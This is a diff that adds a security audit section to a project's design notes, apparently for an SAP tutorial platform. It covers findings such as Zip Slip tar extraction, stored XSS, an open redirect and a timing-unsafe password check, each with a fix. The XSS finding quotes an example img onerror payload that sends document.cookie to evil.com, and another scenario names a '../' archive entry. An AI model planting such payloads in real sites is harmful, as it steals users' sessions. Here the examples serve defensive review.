@@ -231,3 +231,114 @@ Solved via the content push pipeline above — the receiving workflow POSTs a co
 6. **Mark TODO §9 line as done**
 
 **Why this works for production too:** Production will be a first-time deploy to a new HDI container (never had the old `.hdbtable` artifacts). The version=1 migration files create tables with the full current schema. No ALTER history needed.
+
+---
+
+## 12. Security Review (2026-05-01)
+
+First comprehensive security audit of the full implementation. Findings ranked by exploitability confidence (≥80%).
+
+### HIGH Severity
+
+#### 12.1 Path Traversal via Tar Extraction — `approuter/server.js:40`
+
+| Field | Detail |
+|-------|--------|
+| Category | Path Traversal |
+| Confidence | 10/10 |
+| Status | [x] Fixed |
+
+**Description:** The `/admin/rebuild` endpoint extracts a tar.gz archive using `tar.extract({ cwd: TEMP_DIR })` with no `filter` callback. Node-tar without a filter extracts entries containing `../` path components, allowing writes to arbitrary filesystem locations outside TEMP_DIR (classic "Zip Slip" vulnerability).
+
+**Exploit Scenario:** An attacker who possesses or brute-forces the `REBUILD_API_KEY` bearer token crafts a `.tar.gz` with an entry named `../../xs-app.json`. Extraction overwrites the AppRouter route config, enabling unauthenticated access to admin endpoints.
+
+**Fix:** Add a `filter` option to `tar.extract` that rejects entries containing `..` path segments or absolute paths. Or upgrade to node-tar >= 7.x which rejects `../` entries by default.
+
+---
+
+#### 12.2 Stored XSS via Unsanitized Tutorial HTML — `hugo/hugo.toml:11`
+
+| Field | Detail |
+|-------|--------|
+| Category | XSS (Stored) |
+| Confidence | 9/10 |
+| Status | [x] Fixed |
+
+**Description:** Hugo's Goldmark renderer is configured with `unsafe = true`, meaning raw HTML in tutorial markdown is rendered directly into pages. The Hugo build path has **no HTML sanitization** (confirmed by test assertion in `hugo-write.test.ts`). The CSP header includes `script-src 'unsafe-inline'`, providing zero browser-level mitigation.
+
+**Exploit Scenario:** A contributor with write access to any `sap-tutorials` repo inserts `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` into a tutorial step. The build pipeline passes this through unmodified, Hugo renders it as live HTML, and the CSP allows inline script execution. Every authenticated visitor has their session stolen.
+
+**Fix (layered):**
+1. Add HTML sanitization (allowlist of safe tags) in the Hugo write path — similar to the existing VitePress path's `escapeHtmlTags`
+2. Remove `'unsafe-inline'` from the `script-src` CSP directive (use nonces)
+3. Consider `unsafe = false` if tutorials only need standard markdown + Hugo shortcodes
+
+---
+
+### MEDIUM Severity
+
+#### 12.3 Open Redirect via URL Parameter — `display-app/src/App.vue:167`
+
+| Field | Detail |
+|-------|--------|
+| Category | Open Redirect / Phishing |
+| Confidence | 9/10 |
+| Status | [ ] Open |
+
+**Description:** The display app reads `participateUrl` from URL query parameters without validation and renders it as a QR code + clickable `<a href>` link. Any URL (including phishing sites) can be injected.
+
+**Fix:** Validate against an allowlist of permitted domains (e.g., `*.sap.com`, `*.hana.ondemand.com`) and reject `javascript:` / `data:` schemes.
+
+---
+
+#### 12.4 Unauthenticated Endpoints Leak Database Error Details — `srv/server.js:27-34`
+
+| Field | Detail |
+|-------|--------|
+| Category | Data Exposure |
+| Confidence | 8/10 |
+| Status | [ ] Open |
+
+**Description:** `/health/db`, `/build/catalog`, and `/build/navigator` (all unauthenticated) return raw `err.message` from database failures. HANA errors typically include hostnames, ports, and connection parameters.
+
+**Fix:** Return generic error messages to unauthenticated callers; log details server-side only.
+
+---
+
+#### 12.5 Timing Side-Channel in Password Comparison — `srv/lib/tech-user-auth.js:57`
+
+| Field | Detail |
+|-------|--------|
+| Category | Authentication Weakness |
+| Confidence | 8/10 |
+| Status | [ ] Open |
+
+**Description:** Basic Auth password comparison uses `!==` (short-circuits on first differing character). Tech users get `Admin` role on success. Timing analysis can progressively reveal the password.
+
+**Fix:** Use `crypto.timingSafeEqual` with fixed-length buffers.
+
+---
+
+#### 12.6 Unauthenticated WebSocket Event Stream — `srv/event-stream-service.cds:2`
+
+| Field | Detail |
+|-------|--------|
+| Category | Missing Authentication |
+| Confidence | 8/10 |
+| Status | [ ] Open |
+
+**Description:** `EventStreamService` has `@requires: 'any'` (anonymous access). Anyone can connect via WebSocket and passively monitor real-time tutorial completion activity across all events.
+
+**Fix:** Add origin validation and/or token-based auth for WebSocket connections, or accept as intentional for kiosk displays and document the risk.
+
+---
+
+### Positive Security Observations
+
+- All CDS service handlers use parameterized CQL queries — no SQL injection in standard operations
+- DeveloperService, AdminService, DisplayService, ConsolidationService all have proper `@requires` annotations
+- No `eval()`, `exec()`, `spawn()`, or dynamic code execution anywhere in `srv/`
+- No filesystem path traversal in service handlers (only hardcoded `process.cwd()` joins)
+- `@cap-js/audit-logging` with `@PersonalData` annotations provides GDPR-compliant data access logging
+- `@cap-js/change-tracking` provides audit trail for admin entity modifications
+- Vue 3 apps use zero `v-html` directives — all content uses safe `{{ }}` interpolation
